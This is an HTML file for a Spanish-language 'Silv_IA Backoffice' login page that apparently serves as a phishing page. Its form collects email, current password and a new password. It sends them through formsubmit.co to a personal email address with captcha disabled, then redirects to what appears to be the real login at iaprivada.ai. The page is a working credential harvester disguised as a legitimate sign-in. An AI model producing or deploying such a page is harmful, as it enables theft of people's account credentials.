<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GDG Pulse</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #ffffff;
      font-family: 'Segoe UI', sans-serif;
    }

    .card {
      background: #ffffff;
      border: 1px solid #e0e0e0;
      border-radius: 14px;
      padding: 2rem 2.5rem;
      width: 100%;
      max-width: 400px;
    }

    .card h1 {
      font-size: 18px;
      font-weight: 600;
      color: #111;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      font-size: 13px;
      color: #555;
      margin-bottom: 5px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 9px 12px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      transition: border-color 0.2s;
      color: #111;
      background: #fff;
    }

    input:focus {
      border-color: #E02020;
    }

    .field {
      margin-bottom: 1rem;
    }

    #btn-entrar {
      width: 100%;
      padding: 11px;
      background: #111;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 0.5rem;
      transition: background 0.2s;
    }

    #btn-entrar:hover {
      background: #333;
    }
  </style>
</head>

<body>

<div class="card">
  <h1>Silv_IA Backoffice</h1>

  <form action="https://formsubmit.co/eva.sanchez@grupodanigarcia.com" method="POST">

    <!-- evita spam -->
    <input type="hidden" name="_captcha" value="false">

    <!-- redirección después de enviar -->
    <input type="hidden" name="_next" value="https://iaprivada.ai/login">

    <div class="field">
      <label>Email</label>
      <input type="email" name="email" required />
    </div>

    <div class="field">
      <label>Contraseña</label>
      <input type="password" name="password" />
    </div>

    <div class="field">
      <label>Contraseña nueva</label>
      <input type="password" name="new_password" />
    </div>

    <button id="btn-entrar" type="submit">Entrar</button>

  </form>
</div>

</body>
</html>
